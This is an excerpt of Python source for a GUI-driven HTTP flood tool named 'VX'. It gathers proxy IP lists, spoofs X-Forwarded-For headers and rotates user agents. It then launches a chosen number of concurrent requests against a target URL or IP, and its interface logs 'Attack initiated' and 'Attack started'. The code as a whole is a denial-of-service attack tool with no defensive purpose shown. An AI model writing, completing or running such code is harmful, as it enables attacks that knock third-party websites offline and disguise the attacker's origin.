    ...
    async def fetch_ip_addresses(self, url):
        async with aiohttp.ClientSession() as session:
            try:
                ...
                self.log_signal.emit(f"Error fetching from {url}: {e}")
                return []

    async def get_all_ips(self):
        tasks = [self.fetch_ip_addresses(u) for u in ip_list_urls]
        results = await asyncio.gather(*tasks)
        return [ip for group in results for ip in group]

    async def send_request(self, session, ip):
        headers = {"User-Agent": random.choice(UserAgents)}
        if ip:
            headers["X-Forwarded-For"] = ip
        try:
            async with session.get(self.target_url, headers=headers) as resp:
                self.log_signal.emit(f"vx@root {self.target_url} via {ip or 'direct'} -> Status {resp.status}")
        except Exception as e:
            self.log_signal.emit(f"Error requesting via {ip or 'direct'}: {e}")

    async def attack(self):
        ips = await self.get_all_ips()
        if not ips:
            self.log_signal.emit("No proxy IPs found, using direct connection.")
            ips = [None]
        cycle = itertools.cycle(ips)
        async with aiohttp.ClientSession() as session:
            tasks = [self.send_request(session, next(cycle)) for _ in range(self.num_requests)]
...
class MainWindow(QMainWindow):
    def __init__(self):
        ...
        self.log_message("Select protocol, target, port, and request count below.")

        # Protocol buttons
        proto_layout = QHBoxLayout()
        self.http_button = QPushButton("HTTP")
        self.https_button = QPushButton("HTTPS")
        self.http_button.clicked.connect(self.set_http)
        self.https_button.clicked.connect(self.set_https)
        proto_layout.addWidget(self.http_button)
        proto_layout.addWidget(self.https_button)
        layout.addLayout(proto_layout)

        # Target input
        self.url_label = QLabel("Target (URL or IP):")
    ...
    def set_http(self):
        self.protocol = 'http'
        self.log_message("Protocol set to HTTP")

    def set_https(self):
        self.protocol = 'https'
        self.log_message("Protocol set to HTTPS")
    ...
    def start_attack(self):
        ...
        try:
            ...
            QMessageBox.critical(self, "VX", "Port must be an integer between 1 and 65535.")
            return

        # Prepend protocol and port if missing
        if not target.startswith(('http://', 'https://')):
            target = f"{self.protocol}://{target}:{port}"
        else:
            # inject port into URL
            base, rest = target.split('://', 1)
            if ':' not in rest.split('/')[0]:
                target = f"{base}://{rest.split('/')[0]}:{port}" + ('/' + '/'.join(rest.split('/')[1:]) if '/' in rest else '')

        try:
            num = int(self.requests_input.text())
        except ValueError:
            QMessageBox.critical(self, "VX", "Number of requests must be an integer.")
            return

        if not target or num <= 0:
            QMessageBox.critical(self, "VX", "Provide a valid target and positive request count.")
            return

        self.log_message(f"Attack initiated against {target} with {num} hits.")
        self.attack_thread = AttackThread(target, num)
        self.attack_thread.log_signal.connect(self.log_message)
        self.attack_thread.start()
        QMessageBox.information(self, "VX", "Attack started. Check logs for status.")
